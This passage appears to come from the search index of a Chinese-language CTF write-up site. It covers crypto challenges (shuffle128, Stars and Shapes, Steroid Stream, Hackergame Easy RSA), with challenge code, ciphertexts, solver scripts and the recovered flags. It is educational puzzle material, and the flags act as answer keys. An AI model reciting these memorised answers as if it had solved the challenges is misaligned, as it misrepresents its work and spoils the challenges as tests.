0 while True : i = ( i + 1 ) % 128 j = ( j + S [ i ]) % 128 swap ( S , i , j ) yield S [( S [ i ] + S [ j ]) % 128 ] def shuffle ( s : bytes ) -> bytes : bits = bitarray () bits . frombytes ( s ) random . shuffle ( bits ) return bits . tobytes () def xor ( s1 : bytes , s2 : bytes ) -> bytes : assert len ( s1 ) == len ( s2 ) return bytes ( c1 ^ c2 for c1 , c2 in zip ( s1 , s2 )) if __name__ == '__main__' : from secret import FLAG random . seed ( 2023 ) print ( sys . version ) prg = rc4_pseudo_random_generator ( rc4_key_scheduling ( FLAG )) for _ in range ( 64 ): shuffled = shuffle ( FLAG ) key = bytes ( next ( prg ) for _ in range ( len ( FLAG ))) print ( xor ( shuffled , key ) . hex ()) # Output # 3.10.7 (main, Nov 24 2022, 19:45:47) [GCC 12.2.0] # 7dfdf6eba4da43bf7ca6eb64d3fbaac5e764b2c8e66e1f2a30e3b9e95b2ef48b28f105cdfc # 3353e19ed6a3ecad7716831b8cc149ad3a1990c8f4682c434d1b7f417e7df9e9ca0743fc3a # 2e15e68721c7773a920d9622cbad21b2d48e00358b1107b300ba19c3a48291dc1579eaf4f4 # e0f6b4e61390ce8d1eab002af797eb022c58a6576ef55c78b917268b9fe4d3f45dfc7d5dc3 # de11f01e825a69e5b1e004db1f79974ca9e42a2b0c0197dcb322f5a0e43cf7ddfdb529699d # 976dbf67bf2f67fd947c69696c5ef5bb9186b8031d279165a5fcd1f6ac9d7f668b847ecfc0 # 01f123b89f75d3ab5f744caa4dd892eac598a0b1413cc0abf93509b2bc254a5714fd979f7a # 488b3d4d110f2dca864f6589a58033cc23ca3618db8ce59f398b7b9a6dfd93220e1cd02538 # 6b92f7e54e6406b2d7d1176f5604e22cf4c6710ff35fa4cf7d33a7d1855a7f868da8713faa # f9302dccf5c000ef69c2440fbe22b7eaeb5a95483dda09a0b0414e297ad81fb64fabc60025 # c9b5dcf6031051d3433ddc358f7e18b3f7cec58b37bace17f2fd1e39b1cac64fbfcdbff2aa # bddac6c00310a5c80cb73d640a1b0592ed5d99984971a085941e7ea8e2fd0e86aaa1b7098f # 2ac7cdeb9e7eeb5abad2b4ed1238de39cb17aa4f4d8827ebd36d4a99acb9fb4e44cd365186 # b38ed3a76f5751faaca88fbae7ef53a6a4baa4f29b4bca0ef782b373969d3df62d9c276d69 # 20f40b4267ae37f994dac8fccbb652d29abce709dc9f52223ddebe441899edfb8dc3a31a5d # c9116855c08f1d04cbe6d86d0e9523c564fd3dd8bb79f7898ea7e624aba832e6530ad1231c # b388f35a0f2009326bf66170156e57a36eea83285698fcdf2ba1fbbad199dc9d7860158d5e # 1f8c81249a0428cd781494ada971c49e1cd7121af374ecc70d902ad0f4f736e4ef23f61fc9 # b70d877d5ff8c38096faecb1de2df31ce467372c09c66c54b8e122123b539966937bb94d52 # 72951dcfda3601c762b4ea5119e40e93bbe7a595a35db985cb990f3bbcc74ddc7157f0baff # ca0532f7df0239d0fe60e9a62852384f6cce737884808134fb1960e84803fb6ddc144df3c9 # 78f35e7e26df365e213787a3885ca11c76d14fb998d4a440826b2d8adaa5fe85065c9e9c0d # f3110f509bd39e5ead882e85ccb31906809a0c29e33a79f0b3229e671dba1353c89968c4a4 # 2ac15e7a5dcc821c58ac08d526e5a350ef994bb485fc1c916f59e366e6f7e7ddc76b4a0cae # 381a2afbc6aa95643248d8dd39c44fd7090746af9fa3f3c4f70ba56298d6ca1b36b7d19ec8 # b098dfffe1cd19019ba9c472f6f966964352a958eda8707553021870ba51c9a0b573a59f99 # 02578a8b58c1e9c9d5f4321e0b8eb66922905ec2dfd3bf1a6ef583fcce8846243cf6c609d9 # 93efb1acf6b268c5a79746a28c64adbbbc81924991e13aa971d64f4087c87650ebb6309daa # 9fcbff37a9919d676e6ce86d9bae8f75376b1a7a76de304c622fe163ea7549a8dcccb095f7 # ad25c09cdcc768b53a519daf6f1a0861b4c9530cc9d0cf82fbf7c9f5a9acc2346d611a21d0 # 08aee3c019e664d88f3f1147c4f52d33f2f4ab9fea176625f24a14d517a1d59d338e5bf0aa # 479de7e5e8e7841382bb7c9c844f7f8d900979bd360c6d84dc69bd17e7f4ced202afce5964 # 65c43c740e68be4ac64c559f09b461904be78fe5f5eaa6f78afb23a1d9c12ecf1d14a287a3 # 90063ef6a3b48091f514f1b87dc3ef40942989648043df1dda7d1221c0efea863f69f2fba6 # e4c2976ec29fec9cc3d04ec5f4dde4e282886be0c5ee471ccb8cd201558adb759375c27d78 # 1ec9458af0857b6f437ee5d72de707eb6d38df96a830bb53775667f9722a46869e0954b5ad # 5de6f6df232cc29f3fcaac177f323ecfd99732e7559f9d6ffdd706e387bcc23127891be4e1 # 7df2884288490b19fd7d20c746508c3ee8e77706c549ba5a07bf9cc183ede90e5cdd6cc59b # 6ebc5d2caff2d0fc8afb538ea990f4289f716375834a67966dc6eba35b7559726826c23bd4 # e6bdfbfe7f094d6ecfdf76433cfc3c64c5041ad8aeaf84ba5c8473b24d836f332e8e41eabe # 6b845fefb8e5fe2253600c137047ee029a1bab28e9b45eda71597169148593938049092ee2 # 1172b4a57311da2ff968e1071c4eff0bd22a333cfdc8a6fdef41a4b98f69620152bbeb60b5 # 5a788ee6a476eaaa3f581eaebc2589efa640ac37fc5faa4f3591b7db58234dd8fb9743192d # 07d49bf8af3cf3ac77db932a41b81d61736b7e8f5bb656b2a9637f57b7871c1297bf5e3b14 # 94d1d09e9c3d024538c4e5fedafbf5aed564d9998dec700647f704115f281efe74aefc0231 # b11b4ff19b77cd69f1881e5401c6e56a9bbf2e88bb443b3340de8d01c4768c6efa34233b35 # dfc7edc0fa6232d7df18717c9dec7631295a035afdeeea7e2dfaec3518e58c8189f65dd52f # 5490e892fca7f4be4312ad69b1eed46e11cb94bf8bafd2ef725e77fd9620ba980fa1d46563 # b9066eb49cb42ecfdcd9f7713e0feddb920043908df127cf35386df3b4bce6fab3c6a3e89f # 8c51507ea79ffb2914436f8c9fa39501d89b8f9446cbe2fcfb0bada4886ff76b20ce1e29f3 # 6df94fc313b82da575073aeb54c35e5d3ff0c9dc7032cbffcc92b47b2fead75610d6157bca # b92cf23e538fc6b3d1c0e28dd81f3c2a58d890bf323da321a39c9fb601caee4bcc1ccc9abd # 0cc0985f966eb484c5f26b9bb8821dabf3b88d3471b55c6351a43fde32428519241a0ddd76 # 78cf7e7bf1ffa53812d1c9b47fc23852b2fcd318f7ea21dba12ad3a1d4f38e2ba1a5116aa9 # e35e377f7972b49fbb82a42f90443ca77adb678fa278bf93046c8ec2bc05cb2155d5b506d6 # 3bc4ffa6eb16c6da6c40d78b132131092bc8f0696a81e14deca5018daea56c6678befbc1f8 # 138d167661180fc7b7c52fa821c518a29d41c5a73aee9969f74b096cff8fca7ead4f5affe9 # 3784f8b584545b1ef09aa3815182776966eb9d4758f25ae89550aee3916dce6f40d29c79ee # 09913e8ed1778c95cbac302c86cc4ba5ad8b5fe113c78352d00979e84dcd10c3ecd036fba0 # d1ed85304ea4a3e03233544efb85017c9cd1d3259d959acc0f0dbdaece9ed668d937d52309 # e6b89393cfd0e888c8dce582495d216760eb1a8032103351d15c8033a46aae338a11ac99ee # 92683cb1cb9f24a7925395f54be8b0e520ffd5afbc80c11256e33324bf2509a1c9b64f46dc # 0b7e5204fba4ceec74ee7b35417ecb88fa8a74c6575bb6de8f15f1257b6e02a42e4b56dff0 # 49d609e06cb04aa787ebe99d741d4b60b909a00c0de6faecbf4c6d21559495a7c67060625d","title":"\u9898\u76ee"},{"location":"crypto/shuffle128/#_2","text":"RC4 \u5728\u5b9e\u73b0\u4e0a\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u91cd\u70b9\u5728 S \u6570\u7ec4\u7684\u8303\u56f4\u5728 \\([0, 127]\\) \uff0c\u6240\u4ee5\u6bcf\u6b21\u5f02\u6216\u90fd\u4f1a\u6cc4\u6f0f Flag \u5b57\u8282\u7684\u6700\u9ad8\u6709\u6548\u4f4d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import random cts = [ '7dfdf6eba4da43bf7ca6eb64d3fbaac5e764b2c8e66e1f2a30e3b9e95b2ef48b28f105cdfc' , ... '49d609e06cb04aa787ebe99d741d4b60b909a00c0de6faecbf4c6d21559495a7c67060625d' ] flag_bits = [ 0 ] * 37 * 8 random . seed ( 2023 ) for ct in cts : a = list ( range ( 37 * 8 )) random . shuffle ( a ) for i , c in zip ( a [:: 8 ], bytes . fromhex ( ct )): flag_bits [ i ] = c >> 7 print ( int ( '' . join ( map ( str , flag_bits )), 2 ) . to_bytes ( 37 , 'big' ))","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/shuffle128/#flag","text":"TetCTF{ _1nsuff1c13nt 3ntr0py ___}","title":"Flag"},{"location":"crypto/stars_and_shapes/","text":"\u9898\u76ee \u00b6 This might be a difficult question, but I'm sure you can do it with your eyes closed. \u89e3\u9898\u601d\u8def \u00b6 \u7531 you can do it with your eyes closed \u5e76\u7ed3\u5408\u4e09\u884c\u4e24\u5217\u7684\u7ed3\u6784\uff0c\u53ef\u4ee5\u8054\u60f3\u5230\u76f2\u6587 \u5c06 GIF \u62c6\u5206\u6210 JPG\uff0c\u53ef\u4ee5\u770b\u5230\u82b1\u62ec\u53f7 \u4f7f\u7528 Braille Alphabet \u67e5\u8be2\u76f2\u6587\u5bf9\u5e94\u5b57\u7b26\uff0c\u7ed3\u5408\u82b1\u62ec\u53f7\u4f4d\u7f6e\u83b7\u5f97 Flag\uff1a dsc{d0-you-th1nk-h3-s4w-us7132}","title":"Stars and Shapes"},{"location":"crypto/stars_and_shapes/#_1","text":"This might be a difficult question, but I'm sure you can do it with your eyes closed.","title":"\u9898\u76ee"},{"location":"crypto/stars_and_shapes/#_2","text":"\u7531 you can do it with your eyes closed \u5e76\u7ed3\u5408\u4e09\u884c\u4e24\u5217\u7684\u7ed3\u6784\uff0c\u53ef\u4ee5\u8054\u60f3\u5230\u76f2\u6587 \u5c06 GIF \u62c6\u5206\u6210 JPG\uff0c\u53ef\u4ee5\u770b\u5230\u82b1\u62ec\u53f7 \u4f7f\u7528 Braille Alphabet \u67e5\u8be2\u76f2\u6587\u5bf9\u5e94\u5b57\u7b26\uff0c\u7ed3\u5408\u82b1\u62ec\u53f7\u4f4d\u7f6e\u83b7\u5f97 Flag\uff1a dsc{d0-you-th1nk-h3-s4w-us7132}","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/steroid_stream/","text":"\u9898\u76ee \u00b6 I found a weird stream cipher scheme. Can you break this? CTFtime.org / pbctf 2021 / Steroid Stream \u89e3\u9898\u601d\u8def \u00b6 Alkaloid Stream \u8fdb\u9636\u7248\uff0c\u9664\u4e86 fake \u6570\u7ec4\u7684\u4ea7\u751f\u65b9\u5f0f\u6709\u6240\u5dee\u5f02\uff0c\u5176\u4ed6\u90e8\u5206\u90fd\u662f\u4e00\u6837\u7684 1 2 3 4 5 6 fake = [ 0 ] * ln for i in range ( ln - ln // 3 ): arr = list ( range ( i + 1 , ln )) random . shuffle ( arr ) for j in arr [: ln // 3 ]: # \u5728 [i + 1, ln) \u4e2d\u968f\u673a\u9009\u53d6 ln // 3 \u4e2a key \u5f02\u6216 fake [ i ] ^= key [ j ] \u5bf9\u4e8e fake \u6570\u7ec4\u4e2d\u4e0b\u6807\u4e3a \\([ln - ln // 3, ln)\\) \u7684\u5143\u7d20\u503c\u5747\u4e3a \\(0\\) \u5f02\u6216\u7b49\u540c\u4e8e \\(GF(2)\\) \u4e2d\u7684\u52a0\u6cd5\uff0c\u53ef\u4ee5\u628a fake \u6570\u7ec4\u4e2d\u7684\u503c\u770b\u4f5c\u662f\u5df2\u77e5 keys \u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u800c keys \u6570\u7ec4\u4e2d\u7684\u503c\u76f8\u4e92\u95f4\u7ebf\u6027\u65e0\u5173\uff0c\u4ece\u800c\u53ef\u4ee5\u533a\u5206 fake \u548c keys \u4f7f\u7528\u5df2\u77e5 keys \u6784\u5efa\u4e00\u4e2a\u4ee5 keys \u4e3a\u884c\u7684 \\(GF(2)\\) \u77e9\u9635\uff0c\u5047\u8bbe keys \u7684\u6570\u91cf\u4e3a \\(k\\) \uff0c\u90a3\u4e48\u6709 \\(k\\) \u884c\u76f8\u4e92\u72ec\u7acb\uff0c\u77e9\u9635\u7684\u79e9\uff08rank\uff09\u4e3a \\(k\\) \u3002\u6dfb\u52a0\u503c \\(v\\) \u5230 \\(k + 1\\) \u884c\uff0c\u5982\u679c \\(v\\) \u662f keys \u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u90a3\u4e48\u77e9\u9635\u7684\u79e9\u4ecd\u4e3a \\(k\\) \uff0c\u5426\u5219\u662f \\(k + 1\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 def gf2_rank ( rows ): \"\"\" Find rank of a matrix over GF2. The rows of the matrix are given as nonnegative integers, thought of as bit-strings. This function modifies the input list. Use gf2_rank(rows.copy()) instead of gf2_rank(rows) to avoid modifying rows. \"\"\" rank = 0 while rows : pivot_row = rows . pop () if pivot_row : rank += 1 lsb = pivot_row & - pivot_row for index , row in enumerate ( rows ): if row & lsb : rows [ index ] = row ^ pivot_row return rank def is_linear_combination ( keys , test ): rows = keys . copy () rows . append ( test ) return len ( rows ) > gf2_rank ( rows ) keys , remain = [], [] for p in public : if 0 in p : keys . append ( p [ 0 ] + p [ 1 ]) else : remain . append ( p ) while remain : cur_remain = [] for p in remain : if is_linear_combination ( keys , p [ 0 ]): keys . append ( p [ 1 ]) elif is_linear_combination ( keys , p [ 1 ]): keys . append ( p [ 0 ]) else : cur_remain . append ( p ) remain = cur_remain keystream = recover_keystream ( keys , public ) print ( bits_to_bytes ( xor ( enc , keystream ))) # b'pbctf{I_hope_you_enjoyed_this_challenge_now_how_about_playing_Metroid_Dread?}' \u53c2\u8003\u8d44\u6599 \u00b6 \u53e6\u4e00\u79cd\u4e16\u754c\u89c2\u2014\u2014\u6709\u9650\u57df GF(2) - Wikipedia Linear combination - Wikipedia Rank (linear algebra) - Wikipedia Fast computation of matrix rank over GF(2) \u62d3\u5c55\u9605\u8bfb \u00b6 [Tutorial] Matroid intersection in simple words - Codeforces","title":"Steroid Stream"},{"location":"crypto/steroid_stream/#_1","text":"I found a weird stream cipher scheme. Can you break this? CTFtime.org / pbctf 2021 / Steroid Stream","title":"\u9898\u76ee"},{"location":"crypto/steroid_stream/#_2","text":"Alkaloid Stream \u8fdb\u9636\u7248\uff0c\u9664\u4e86 fake \u6570\u7ec4\u7684\u4ea7\u751f\u65b9\u5f0f\u6709\u6240\u5dee\u5f02\uff0c\u5176\u4ed6\u90e8\u5206\u90fd\u662f\u4e00\u6837\u7684 1 2 3 4 5 6 fake = [ 0 ] * ln for i in range ( ln - ln // 3 ): arr = list ( range ( i + 1 , ln )) random . shuffle ( arr ) for j in arr [: ln // 3 ]: # \u5728 [i + 1, ln) \u4e2d\u968f\u673a\u9009\u53d6 ln // 3 \u4e2a key \u5f02\u6216 fake [ i ] ^= key [ j ] \u5bf9\u4e8e fake \u6570\u7ec4\u4e2d\u4e0b\u6807\u4e3a \\([ln - ln // 3, ln)\\) \u7684\u5143\u7d20\u503c\u5747\u4e3a \\(0\\) \u5f02\u6216\u7b49\u540c\u4e8e \\(GF(2)\\) \u4e2d\u7684\u52a0\u6cd5\uff0c\u53ef\u4ee5\u628a fake \u6570\u7ec4\u4e2d\u7684\u503c\u770b\u4f5c\u662f\u5df2\u77e5 keys \u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u800c keys \u6570\u7ec4\u4e2d\u7684\u503c\u76f8\u4e92\u95f4\u7ebf\u6027\u65e0\u5173\uff0c\u4ece\u800c\u53ef\u4ee5\u533a\u5206 fake \u548c keys \u4f7f\u7528\u5df2\u77e5 keys \u6784\u5efa\u4e00\u4e2a\u4ee5 keys \u4e3a\u884c\u7684 \\(GF(2)\\) \u77e9\u9635\uff0c\u5047\u8bbe keys \u7684\u6570\u91cf\u4e3a \\(k\\) \uff0c\u90a3\u4e48\u6709 \\(k\\) \u884c\u76f8\u4e92\u72ec\u7acb\uff0c\u77e9\u9635\u7684\u79e9\uff08rank\uff09\u4e3a \\(k\\) \u3002\u6dfb\u52a0\u503c \\(v\\) \u5230 \\(k + 1\\) \u884c\uff0c\u5982\u679c \\(v\\) \u662f keys \u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u90a3\u4e48\u77e9\u9635\u7684\u79e9\u4ecd\u4e3a \\(k\\) \uff0c\u5426\u5219\u662f \\(k + 1\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 def gf2_rank ( rows ): \"\"\" Find rank of a matrix over GF2. The rows of the matrix are given as nonnegative integers, thought of as bit-strings. This function modifies the input list. Use gf2_rank(rows.copy()) instead of gf2_rank(rows) to avoid modifying rows. \"\"\" rank = 0 while rows : pivot_row = rows . pop () if pivot_row : rank += 1 lsb = pivot_row & - pivot_row for index , row in enumerate ( rows ): if row & lsb : rows [ index ] = row ^ pivot_row return rank def is_linear_combination ( keys , test ): rows = keys . copy () rows . append ( test ) return len ( rows ) > gf2_rank ( rows ) keys , remain = [], [] for p in public : if 0 in p : keys . append ( p [ 0 ] + p [ 1 ]) else : remain . append ( p ) while remain : cur_remain = [] for p in remain : if is_linear_combination ( keys , p [ 0 ]): keys . append ( p [ 1 ]) elif is_linear_combination ( keys , p [ 1 ]): keys . append ( p [ 0 ]) else : cur_remain . append ( p ) remain = cur_remain keystream = recover_keystream ( keys , public ) print ( bits_to_bytes ( xor ( enc , keystream ))) # b'pbctf{I_hope_you_enjoyed_this_challenge_now_how_about_playing_Metroid_Dread?}'","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/steroid_stream/#_3","text":"\u53e6\u4e00\u79cd\u4e16\u754c\u89c2\u2014\u2014\u6709\u9650\u57df GF(2) - Wikipedia Linear combination - Wikipedia Rank (linear algebra) - Wikipedia Fast computation of matrix rank over GF(2)","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/steroid_stream/#_4","text":"[Tutorial] Matroid intersection in simple words - Codeforces","title":"\u62d3\u5c55\u9605\u8bfb"},{"location":"crypto/ustc_easy_rsa/","text":"\u9898\u76ee \u00b6 \u81ea\u4ece Hackergame 2018 \u516c\u7136\u63ed\u9732\u4e86\u5927\u6574\u6570\u53ef\u4ee5\u88ab\u795e\u7ae5\u53e3\u7b97\u5206\u89e3\u7684\u4e8b\u5b9e \uff0cRSA \u5728 hackergame \u4e2d\u5df2\u7ecf\u53ea\u80fd\u5904\u4e8e\u4f4e\u5206\u503c\u7684\u5730\u4f4d\u4e86\u3002\u5982\u679c\u4e0d\u5728\u5176\u540d\u79f0\u524d\u9762\u52a0\u4e0a Easy \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4f3c\u4e4e\u5c31\u4f1a\u663e\u5f97\u5b8c\u5168\u5bf9\u4e0d\u8d77\u5176\u4ed6\u9898\u76ee\u3002 \u66f4\u4f55\u51b5\uff0c\u5728\u672c\u9898\u7684\u9644\u4ef6\u4e2d\uff0c\u4f60\u8fd8\u83b7\u5f97\u4e86\u6784\u9020 p \u548c q \u7684\u65b9\u5f0f\u3002\u6570\u7406\u57fa\u7840\u624e\u5b9e\u7684\u4f60\u5e94\u8be5\u53ef\u4ee5\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u5427\u3002 Easy_RSA.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import math import sympy from Crypto.Util.number import * e = 65537 def get_p (): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 value_p = sympy . nextprime (( math . factorial ( y )) % x ) # Hint\uff1a\u8fd9\u91cc\u76f4\u63a5\u8ba1\u7b97\u4f1a\u6ea2\u51fa\uff0c\u8bf7\u4f60\u4ed4\u7ec6\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81 return value_p def get_q (): value = [ getPrime ( 256 )] for i in range ( 1 , 10 ): value . append ( sympy . nextprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967 n = 1 for i in range ( 10 ): n = n * value [ i ] q = getPrime ( 512 ) value_q = pow ( q , e , n ) print ( \"value_q = \" , value_q ) # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy . nextprime ( q ) # this destroyes the rsa cryptosystem p = get_p () q = get_q () m = int . from_bytes ( open ( \"flag.txt\" , \"rb\" ) . read (), \"big\" ) c = pow ( m , e , p * q ) print ( \"c = \" , c ) # c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478 \u89e3\u9898\u601d\u8def \u00b6 \u52a0\u5bc6\u65b9\u5f0f\u548c RSA \u6ca1\u6709\u533a\u522b\uff0c\u53ea\u9700\u8981\u5f97\u5230\u52a0\u5bc6\u4f7f\u7528\u7684 p \u548c q \u5c31\u53ef\u4ee5\u4e86\uff01 p \u503c\u4e3a y \u7684\u9636\u4e58\u6a21 x \u7684\u4e0b\u4e00\u4e2a\u8d28\u6570\uff0c\u7531\u4e8e y \u503c\u8f83\u5927\uff0c\u76f4\u63a5\u6c42\u9636\u4e58\u6bd4\u8f83\u56f0\u96be\u3002\u4ed4\u7ec6\u89c2\u5bdf y \u4e0e x \u5dee\u503c\u8f83\u5c0f\uff0c\u4e14 x \u4e3a\u8d28\u6570\uff0c \\(y < x\uff0cy > x/2\\) \uff0c\u53ef\u4ee5\u4f7f\u7528\u5a01\u5c14\u900a\u5b9a\u7406\u5feb\u901f\u6c42\u89e3 \\((x-1)! \\equiv -1 \\,(mod \\, x)\\) \\((y-1)! \\equiv -1 \\,(mod \\, y)\\) \\(y! * (y+1) * ... * (x-2) * (x-1) \\equiv -1 \\,(mod \\, x)\\) \\(y! \\equiv -[(y+1) * ... * (x-2) * (x-1)]^{-1} \\, (mod \\, x)\\) \u91cd\u5199 get_p() \u51fd\u6570\uff0c\u6c42\u9006\u5143\u677f\u5b50\u6307\u8def -> easy_RSA 1 2 3 4 5 6 7 8 9 def get_p (): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 multi = 1 for i in range ( y + 1 , x ): multi = ( i * multi ) % x factor = ( x - modinv ( multi , x )) % x value_p = sympy . nextprime ( factor ) return value_p q \u503c\u6c42\u89e3\u7c7b\u4f3c\u4e8e RSA \u89e3\u5bc6\uff0c\u5148\u4f7f\u7528 prevprime \u5012\u63a8 value \u83b7\u5f97 \\(n\\) \u7684\u6240\u6709\u56e0\u6570\uff0c\u4ece\u800c\u83b7\u5f97 \\(\\varphi(n)\\) \uff0c\u8fdb\u800c\u6c42\u51fa \\(d\\) 1 2 3 4 5 6 7 8 9 10 11 12 def get_real_q (): value = [ 80096058210213458444437404275177554701604739094679033012396452382975889905967 ] for i in range ( 1 , 10 ): value . append ( sympy . prevprime ( value [ i - 1 ])) value . reverse () n = fn = 1 for i in range ( 10 ): fn *= ( value [ i ] - 1 ) n *= value [ i ] d = modinv ( e , fn ) value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy . nextprime ( pow ( value_q , d , n )) p \u3001 q \u548c e \u90fd\u5f97\u5230\u4e86\uff0c\u89e3\u5bc6\u5c31\u662f\u5206\u5206\u949f\u7684\u4e8b\u5566 XD 1 2 3 4 5 fn = ( p - 1 ) * ( q - 1 ) d = modinv ( e , fn ) print ( long_to_bytes ( pow ( c , d , p * q ))) # b'flag{CRYPT0_1s_Interesting!}' \u53c2\u8003\u8d44\u6599 \u00b6 Wilson's theorem - Wikipedia","title":"HackerGame - Easy RSA"},{"location":"crypto/ustc_easy_rsa/#_1","text":"\u81ea\u4ece Hackergame 2018 \u516c\u7136\u63ed\u9732\u4e86\u5927\u6574\u6570\u53ef\u4ee5\u88ab\u795e\u7ae5\u53e3\u7b97\u5206\u89e3\u7684\u4e8b\u5b9e \uff0cRSA \u5728 hackergame \u4e2d\u5df2\u7ecf\u53ea\u80fd\u5904\u4e8e\u4f4e\u5206\u503c\u7684\u5730\u4f4d\u4e86\u3002\u5982\u679c\u4e0d\u5728\u5176\u540d\u79f0\u524d\u9762\u52a0\u4e0a Easy \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4f3c\u4e4e\u5c31\u4f1a\u663e\u5f97\u5b8c\u5168\u5bf9\u4e0d\u8d77\u5176\u4ed6\u9898\u76ee\u3002 \u66f4\u4f55\u51b5\uff0c\u5728\u672c\u9898\u7684\u9644\u4ef6\u4e2d\uff0c\u4f60\u8fd8\u83b7\u5f97\u4e86\u6784\u9020 p \u548c q \u7684\u65b9\u5f0f\u3002\u6570\u7406\u57fa\u7840\u624e\u5b9e\u7684\u4f60\u5e94\u8be5\u53ef\u4ee5\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u5427\u3002 Easy_RSA.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import math import sympy from Crypto.Util.number import * e = 65537 def get_p (): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 value_p = sympy . nextprime (( math . factorial ( y )) % x ) # Hint\uff1a\u8fd9\u91cc\u76f4\u63a5\u8ba1\u7b97\u4f1a\u6ea2\u51fa\uff0c\u8bf7\u4f60\u4ed4\u7ec6\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81 return value_p def get_q (): value = [ getPrime ( 256 )] for i in range ( 1 , 10 ): value . append ( sympy . nextprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967 n = 1 for i in range ( 10 ): n = n * value [ i ] q = getPrime ( 512 ) value_q = pow ( q , e , n ) print ( \"value_q = \" , value_q ) # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy . nextprime ( q ) # this destroyes the rsa cryptosystem p = get_p () q = get_q () m = int . from_bytes ( open ( \"flag.txt\" , \"rb\" ) . read (), \"big\" ) c = pow ( m , e , p * q ) print ( \"c = \" , c ) # c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478","title":"\u9898\u76ee"},{"location":"crypto/ustc_easy_rsa/#_2","text":"\u52a0\u5bc6\u65b9\u5f0f\u548c RSA \u6ca1\u6709\u533a\u522b\uff0c\u53ea\u9700\u8981\u5f97\u5230\u52a0\u5bc6\u4f7f\u7528\u7684 p \u548c q \u5c31\u53ef\u4ee5\u4e86\uff01 p \u503c\u4e3a y \u7684\u9636\u4e58\u6a21 x \u7684\u4e0b\u4e00\u4e2a\u8d28\u6570\uff0c\u7531\u4e8e y \u503c\u8f83\u5927\uff0c\u76f4\u63a5\u6c42\u9636\u4e58\u6bd4\u8f83\u56f0\u96be\u3002\u4ed4\u7ec6\u89c2\u5bdf y \u4e0e x \u5dee\u503c\u8f83\u5c0f\uff0c\u4e14 x \u4e3a\u8d28\u6570\uff0c \\(y < x\uff0cy > x/2\\) \uff0c\u53ef\u4ee5\u4f7f\u7528\u5a01\u5c14\u900a\u5b9a\u7406\u5feb\u901f\u6c42\u89e3 \\((x-1)! \\equiv -1 \\,(mod \\, x)\\) \\((y-1)! \\equiv -1 \\,(mod \\, 